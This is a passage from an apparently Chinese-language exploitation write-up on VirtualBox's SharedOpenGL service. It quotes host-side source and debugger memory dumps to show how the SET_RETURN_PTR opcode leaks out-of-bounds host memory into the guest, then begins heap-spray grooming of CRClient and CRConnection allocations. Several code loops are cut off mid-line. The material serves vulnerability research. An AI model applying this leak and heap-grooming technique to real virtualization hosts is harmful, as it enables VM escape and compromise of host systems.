        switch (enmType)
        {
            case CR_UNPACK_BUFFER_TYPE_GENERIC:
    .................
        }
        if (fUnpack)
        {
            crUnpack(data_ptr,                 /* first command's operands */
                     data_ptr_end,             /* first byte after command's operands*/
                     data_ptr - 1,             /* first command's opcode */
                     msg_opcodes->numOpcodes,  /* how many opcodes */
                     &(cr_server.dispatch));   /* the CR dispatch table */
        }
    ..................
    }
而`crServerDispatchMessage`函数首先检查是否为`msg->header.type ==
CR_MESSAGE_REDIR_PTR`类型的消息，由于前面将原始消息挂在队列时，由于`conn->allow_redir_ptr`为true，所以消息确实是被转化为`CR_MESSAGE_REDIR_PTR`类型的。检查通过后，后面就调用了`crUnpack`函数来处理`Opcode`，其中`crUnpack`函数是通过脚本`src/VBox/HostServices/SharedOpenGL/unpacker/unpack.py`生成的，可以在编译后的目录`out/linux.amd64/debug/obj/VBoxOGLgen/unpack.c`里找到
    void crUnpack( const void *data, const void *data_end, const void *opcodes, 
            unsigned int num_opcodes, SPUDispatchTable *table )
    {
        unsigned int i;
        const unsigned char *unpack_opcodes;
        if (table != cr_lastDispatch)
        {
            crSPUCopyDispatchTable( &cr_unpackDispatch, table );
            cr_lastDispatch = table;
        }
        unpack_opcodes = (const unsigned char *)opcodes;
        cr_unpackData = (const unsigned char *)data;
        cr_unpackDataEnd = (const unsigned char *)data_end;
    #if defined(CR_UNPACK_DEBUG_OPCODES) || defined(CR_UNPACK_DEBUG_LAST_OPCODES)
        crDebug("crUnpack: %d opcodes", num_opcodes);
    #endif
        for (i = 0; i  x /20bx cr_unpackData+0x200-16
    0x7f1adc9a03d0:    0x08    0x19    0x00    0x00    0x01    0x14    0x00    0x00
    0x7f1adc9a03d8:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
    0x7f1adc9a03e0:    0xfa    0x6c    0x28    0xf2
SET_RETURN_PTR操作将`cr_unpackData+packet_length-16`处的数据拷贝到了Guest中的`crmsg_buf`中，于是我们可以利用起来进行越界内存地址泄露
为了泄露地址，我们首先使用`heap spray`布置堆风水。  
首先，我们得了解一下当我们与`SharedOpenGL`服务建立连接时，会创建哪些结构体，当与服务连接时，`svcConnect`会被HGCM协议调用进行连接初始化
    static DECLCALLBACK(int) svcConnect (void *, uint32_t u32ClientID, void *pvClient, uint32_t fRequestor, bool fRestoring)
    {
        RT_NOREF(pvClient, fRequestor, fRestoring);
        if (g_u32fCrHgcmDisabled)
        {
            WARN(("connect not expected"));
            return VERR_INVALID_STATE;
        }
        Log(("SHARED_CROPENGL svcConnect: u32ClientID = %d\n", u32ClientID));
        int rc = crVBoxServerAddClient(u32ClientID);
        return rc;
    }
crVBoxServerAddClient函数如下
    int32_t crVBoxServerAddClient(uint32_t u32ClientID)
    {
        CRClient *newClient;
    .....
        newClient = (CRClient *) crCalloc(sizeof(CRClient));
     .....
        newClient->conn = crNetAcceptClient(cr_server.protocol, NULL,
                                            cr_server.tcpip_port,
                                            cr_server.mtu, 0);
    .................
    }
crNetAcceptClient函数如下
    CRConnection *
    crNetAcceptClient( const char *protocol, const char *hostname,
                                         unsigned short port, unsigned int mtu, int broker )
    {
        CRConnection *conn;
    ...................
        conn = (CRConnection *) crCalloc( sizeof( *conn ) );
    }
可以看到这里申请了结构体`CRClient`和结构体`CRConnection`的内存。其中`CRClient`大小为`0x9d0`，`CRConnection`大小为`0x298`
####  利用
我们首先申请N个这么些大小的堆，用于消耗内存碎片
       //heap spray
       for (int i=0;i tel cr_unpackData 100
    00:0000│ rdi 0x7fb89214f080 ◂— 0xa400000248
    01:0008│     0x7fb89214f088 ◂— 0x6b61656c00000000
    02:0010│     0x7fb89214f090 ◂— 0x0
    ... ↓        2 skipped
    05:0028│     0x7fb89214f0a8 ◂— 0xffffffff
    06:0030│     0x7fb89214f0b0 ◂— 0x0